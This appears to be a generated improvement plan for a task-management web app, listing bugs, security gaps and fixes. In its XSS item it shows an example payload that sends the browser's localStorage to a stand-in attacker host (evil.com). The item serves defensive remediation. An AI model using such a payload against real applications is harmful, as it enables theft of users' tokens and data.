# Arete — Improvement Plan
_Generated: 2026-08-08 | Scanned: index.html (14,924 lines), givelink.html, landing.html, sw.js, api/claude.js_

---

## 🔥 P0 — Ship this week (bugs breaking user flows)

### 1. Every AI feature gives advice to "Panos / Givelink / SF move" — not the actual user
- **What**: "Panos", "Givelink B2B SaaS for nonprofits", and "SF move" are hardcoded in at least 8 AI prompt strings. Every signed-in user gets AI suggestions about a specific person's startup, relocation plan, and relationship network. The `getAboutMe()` helper exists and is partially used, but is bypassed by these hardcoded strings.
- **Where**: `index.html:1070` (HTML `<h1>` before JS), `index.html:2519` (default profile name), `index.html:5445` (automation suggestions), `index.html:5647` (relationship nudges), `index.html:5920` (discomfort insights), `index.html:11415` (weekly notes synthesis), `index.html:11672` (AI morning briefing), `index.html:11810` (relationship message drafts)
- **Why it matters**: Every AI-powered feature — the product's core differentiator — is producing wrong, confusing output for every user who is not Panos. This is the worst possible demo of the product.
- **Effort**: M
- **Suggested fix**:
  - Replace all hardcoded `Panos` references with `${profileName}` (already defined).
  - Replace all "Givelink B2B SaaS for nonprofits" context strings with `${getAboutMe()}` or a user-editable "About me" field in Settings.
  - Remove "SF move" and other personal planning references entirely from prompts.
  - Change `<h1 id="greeting">Good morning, Panos 👋</h1>` (line 1070) to a blank/generic placeholder — it flashes visibly before JS renders.

---

### 2. AI morning briefing silently never runs in proxy-mode deployments
- **What**: `_fetchAIBriefing()` checks `localStorage.getItem('taskos_api_key')` (line 11670) to decide whether to proceed. That key is never set anywhere in the codebase. The actual key paths are `S.claudeKey` (direct) and `APP_CONFIG.aiProxy` (proxy). The morning briefing therefore returns immediately for every proxy-mode user — silently, with no error.
- **Where**: `index.html:11670`
- **Why it matters**: The AI morning briefing is one of the app's flagship features. It appears to work during local dev (where the developer enters `S.claudeKey` directly) but is dead for all hosted/proxy users.
- **Effort**: S
- **Suggested fix**:
  - Change the guard at line 11670 from `if(!S.claudeKey&&!localStorage.getItem('taskos_api_key'))return;` to `if(!S.claudeKey&&!APP_CONFIG.aiProxy)return;` — matching the pattern used by all other AI functions.

---

### 3. Push notification icons are a 404
- **What**: Service worker and in-page reminder system both reference `./icons/icon-192.png`, which does not exist. The correct root-level path is `./icon-192.png`.
- **Where**: `sw.js:46-47`, `index.html:11289`
- **Why it matters**: Push notifications from the service worker fire with a broken badge. On iOS this can suppress the notification entirely. On Android the notification badge shows an error placeholder.
- **Effort**: S
- **Suggested fix**:
  - Change `./icons/icon-192.png` → `./icon-192.png` in all three occurrences.
  - Also fix `reg.installing` being accessed without a null check in the SW update handler (`index.html:10695`); `reg.installing` is null when the worker is already activating and `.addEventListener` on it throws.

---

### 4. "Next Week" bulk action silently orphans tasks
- **What**: The bulk-action bar has a "Move to Next Week" option that writes `bucket: 'next-week'` onto tasks. That bucket is never rendered in any view. Tasks moved there disappear with no recovery path.
- **Where**: `index.html:14850` (`<option value="next-week">Next Week</option>`); `index.html:2903` (`mvB(id, b)` accepts any string)
- **Why it matters**: Silent data loss. A user bulk-moving 10 tasks to "next-week" loses them all. No toast, no indication, no view to find them.
- **Effort**: S
- **Suggested fix**:
  - Remove the `next-week` option, **or** map it to `this-week` in `applyBulkAction()` with a toast.
  - Add a `VALID_BUCKETS` allowlist check in `mvB()` that warns on unknown values.

---

### 5. XSS: task titles interpolated raw into innerHTML in core rendering functions
- **What**: `inboxHTML()`, `tcHTML()`, the weekly review wizard, the blocker dropdown, and the checklist editor all inject user-supplied text (task titles, goal titles, checklist text, person names) into `innerHTML` template literals without calling `esc()`. The helper exists at line 11776 but is inconsistently applied.
- **Where**: `index.html:3223` (inboxHTML), `index.html:3716` (tcHTML), `index.html:3594`, `3601`, `3603` (weekly review), `index.html:2543` (blocker dropdown), `index.html:2527` (checklist editor), `index.html:5557`, `5587` (people), `index.html:8295` (books)
- **Why it matters**: A task title like `<img src=x onerror=fetch('//evil.com?c='+btoa(JSON.stringify(localStorage)))>` executes when the task is rendered. Supabase sync is the real risk vector: if an attacker can write a crafted record into a user's Supabase row (e.g. via the CSV import accepting arbitrary HTML), it executes client-side.
- **Effort**: S
- **Suggested fix**:
  - Replace every `${t.title}`, `${g.title}`, `${p.name}`, `${b.title}`, `${c.text}` inside `innerHTML`-assigned template literals with `${esc(t.title)}` etc.
  - Run a one-time `grep -n 'innerHTML' index.html | grep -v 'esc(' | grep -v '^\s*\/\/'` to find remaining instances.

---

## ⚡ P1 — High ROI (UX friction blocking conversion)

### 6. AI features dead for new users (no proxy configured)
- **What**: `APP_CONFIG.aiProxy` is `''`. All three AI entry points (triage, day planning, task AI reply) check `APP_CONFIG.aiProxy || S.claudeKey` and toast an error to users who haven't manually entered an Anthropic API key. The landing page prominently features AI as the product's differentiator.
- **Where**: `index.html:9959` (`aiProxy: ''`), `index.html:4328`, `5047`, `5111`
- **Why it matters**: A visitor who signs up for "AI that triages your inbox" hits a wall on first meaningful interaction. This is the #1 cause of activation drop-off.
- **Effort**: M
- **Suggested fix**:
  - Deploy `api/claude.js` to Vercel (already written and correct).
  - Set `aiProxy: 'https://<your-vercel-app>.vercel.app/api/claude'` in `APP_CONFIG`.
  - Pair with item #7 (rate limiting) before enabling.

---

### 7. No rate limiting on the Claude API proxy
- **What**: `api/claude.js` passes all authenticated requests to Anthropic with no per-user cap. The file's own comment (line 13) flags this gap explicitly.
- **Where**: `api/claude.js:13` (acknowledged in comment), entire handler
- **Why it matters**: A single user can run an arbitrarily large Anthropic bill. With the proxy live (#6), this is a production blocker.
- **Effort**: M
- **Suggested fix**:
  - Add Upstash Redis rate limiting: 20 requests/user/hour, keyed on the Supabase UID extracted from the verified JWT.
  - Return HTTP 429 with `Retry-After` on breach.

---

### 8. Analytics not wired up — conversion funnel is invisible
- **What**: `APP_CONFIG.posthogKey` and the landing page `POSTHOG_KEY` are both empty strings. Every `track()` call is a no-op. The scroll-depth and CTA-click tracking added in PR #83 collects nothing.
- **Where**: `index.html:9960`, `landing.html:702`
- **Why it matters**: Cannot measure what's driving or killing conversion without data.
- **Effort**: S
- **Suggested fix**:
  - Create a PostHog project, paste the API key into both config locations.
  - Both files share the same PostHog host, so the landing→app funnel identity join works automatically once the key is set.

---

### 9. Personal health/finance targets hardcoded for all users
- **What**: Health and Finance views show progress bars wired to the developer's personal goals: 12% body fat target, 75kg weight target, €25K/year income, €300/month passive income, 5 workouts/week. These are stored in `_NS_TARGETS` and used directly in rendering — users cannot change them.
- **Where**: `index.html:6163` (`_NS_TARGETS`), `index.html:5223`, `5323`, `5324`, `5349`
- **Why it matters**: Every user's Finance and Health dashboards show nonsensical progress bars toward someone else's goals. The €25K/year income target is likely wrong for most users.
- **Effort**: M
- **Suggested fix**:
  - Move `_NS_TARGETS` into `S` (persisted app state) with sensible defaults.
  - Add a "Set targets" section in Settings or inline on the Health/Finance views.

---

### 10. OG/social sharing URLs hardcoded to Vercel subdomain
- **What**: All `og:image`, `og:url`, and `twitter:image` tags are hardcoded to `https://task-management-beige-eight.vercel.app/...` in both app and landing page.
- **Where**: `index.html:24-32`, `landing.html:16-21`
- **Why it matters**: Social sharing on a custom domain shows the raw Vercel URL in link previews, undermining brand credibility. Also sends duplicate-content signals to search engines.
- **Effort**: S
- **Suggested fix**:
  - Add a custom Vercel domain.
  - Set canonical URLs via Vercel's `VERCEL_URL` env var or a build-time replace script.

---

## 🛠 P2 — Code health (tech debt slowing velocity)

### 11. "Givelink Outreach" hardcoded as a focus-day time block for all users
- **What**: The Focus Day Plan has a hardcoded "Givelink Outreach" time block (11–12pm) with a task lookup filtered to `category === 'givelink'` and an inline hex color `#a78bfa`.
- **Where**: `index.html:4375`
- **Why it matters**: Every user's Focus Day shows a "Givelink Outreach" block they can't understand or configure. Category `givelink` is a personal taxonomy — not a standard life-area category.
- **Effort**: S
- **Suggested fix**:
  - Replace the hardcoded block with a generic "Deep Work" or "Project" slot sourced from the user's own categories/goals.
  - Replace the inline hex color with `var(--accent)`.

---

### 12. `_sbToken()` not guarded against parallel refresh races
- **What**: If two async paths (e.g., `callClaude()` + `sbSyncNow()`) both find the token expired simultaneously, both call `_sbAuth('refresh_token', ...)`. The first consumes the refresh token; the second gets a 401, which then triggers an infinite sync retry loop.
- **Where**: `index.html:10022-10026`
- **Why it matters**: Enabling the AI proxy (#6) makes this race condition much more likely — AI calls and background syncs will frequently overlap.
- **Effort**: S
- **Suggested fix**:
  - Introduce a singleton `_sbTokenPromise` variable: if a refresh is already in flight, return that promise instead of starting a new fetch.

---

### 13. `sbSyncNow()` retries indefinitely on auth errors
- **What**: Any error in `sbSyncNow()` sets `_sbPending = true`, which schedules another retry. A 401 (expired token) will retry forever, burning Supabase rate-limit quota.
- **Where**: `index.html:10439`
- **Why it matters**: After a session expires, the app silently floods Supabase with failed auth requests. Visible in Supabase dashboard as steady 401 POSTs from a single user.
- **Effort**: S
- **Suggested fix**:
  - In the catch block, check for auth errors (`e.message.includes('401')` or `'not connected'`) and clear `_sbPending` rather than scheduling a retry.

---

### 14. Service worker still caches `givelink.html` after product separation
- **What**: `sw.js` still includes `./givelink.html` (line 17) and `./manifest-givelink.json` (line 4) in its cache arrays. These were left behind after commit `d635c06` ("Remove Givelink from Task OS").
- **Where**: `sw.js:4`, `sw.js:17`
- **Why it matters**: Wastes the SW cache budget for every Arete user with cached Givelink assets. Confusing if givelink.html changes.
- **Effort**: S
- **Suggested fix**:
  - Remove both entries from `sw.js`. Bump the `CACHE` version string to force a fresh install.

---

### 15. `serviceWorker.register()` has no `.catch()` — unhandled rejection
- **What**: The SW registration promise chain at line 10692 has no `.catch()`. In strict environments (e.g., HTTP origins, some iOS Safari versions) this surfaces as an unhandled promise rejection that can terminate the JS context.
- **Where**: `index.html:10692-10700`
- **Why it matters**: SW registration failure currently breaks silently for all non-HTTPS visitors and any browser that rejects the SW. Offline mode and push notifications stop working with no user feedback.
- **Effort**: S
- **Suggested fix**:
  - Add `.catch(err => console.warn('SW registration failed:', err))` to the `register()` chain.
  - Also guard `reg.installing` against null before calling `.addEventListener` on it (line 10695).

---

## 💡 P3 — Nice to have

### 16. `toast()` accepts raw HTML — fragile, one bad call away from XSS
- **What**: `toast()` sets `el.innerHTML = msg` (line 2789). This is intentionally used for the guest-nudge CTA with an inline `onclick` (line 2596). But the pattern means any future `toast(t.title)` call would execute arbitrary HTML from task titles.
- **Where**: `index.html:2789`, `index.html:2596`
- **Why it matters**: Pattern establishes a dangerous precedent. One future `toast(userInput)` call creates an XSS path.
- **Effort**: S
- **Suggested fix**: Add `opts.html = true` flag. Default to `el.textContent = msg`; only use `innerHTML` when `opts.html` is explicitly true.

---

### 17. No loading state during Supabase sync on first boot
- **What**: `#app-splash` hides as soon as JS initialises, but `sbSyncNow()` may still be fetching. On slow connections, empty views are visible for 1-3 seconds before tasks appear.
- **Where**: `index.html:10131` (sync called at boot), `index.html:37-42` (splash hide logic)
- **Why it matters**: Empty-state flicker in the first 10 seconds of a trial reads as "app is broken".
- **Effort**: M
- **Suggested fix**:
  - Keep the splash visible until the first `sbSyncNow()` resolves.
  - Show skeleton task cards (3-5 placeholders) during the sync rather than a blank panel.

---

### 18. Notion integration retries the CORS-blocked fetch on every modal open
- **What**: After a CORS error (inevitable for Notion's API), no flag is saved. Reopening the import modal triggers the same doomed fetch again, causing a "Fetching from Notion…" flash before the workaround text appears.
- **Where**: `index.html:10927-10966`
- **Why it matters**: Two wasted network requests per modal open. Confusing UX for users who've already been told the API doesn't work.
- **Effort**: S
- **Suggested fix**: On CORS error, set `localStorage.setItem('taskos_notion_cors','1')`. Check it at `fetchFromNotion()` entry to skip the fetch and show the workaround instructions immediately.

---

### 19. Inbox bucket color `#da77f2` drifts into pink — outside the brand violet palette
- **What**: `BCOLORS.inbox = '#da77f2'` (line 2515). The brand palette uses cool violets (`#8272f2`, `#6a58ee`, `#9878ea`). `#da77f2` is a warm magenta-lavender that visually clashes, especially in light mode.
- **Where**: `index.html:2515`
- **Why it matters**: Subtle but the inbox is the highest-traffic view. The off-palette color erodes the "calm, coherent" brand feel.
- **Effort**: S
- **Suggested fix**: Change `'#da77f2'` to `var(--brand2)` (`#a385ee`) or `#b39cf5` to stay in the cool violet family.

---

### 20. PostHog identity not bridged between landing page and app
- **What**: `_phIdentify()` is called correctly on app login, but the landing page has no `posthog.identify()` call. A user who visits the landing page and then signs up is counted as two separate people in PostHog.
- **Where**: `landing.html` (no identify call), `index.html:10395` (app identify)
- **Why it matters**: Funnel attribution is double-counted — landing views and app events appear as separate users, making conversion rates appear artificially low.
- **Effort**: S
- **Suggested fix**: After `posthog.init()` in `landing.html`, call `posthog.identify(localStorage.getItem('taskos_sb_uid') || posthog.get_distinct_id())` if a UID is stored, so returning users are recognized cross-page.
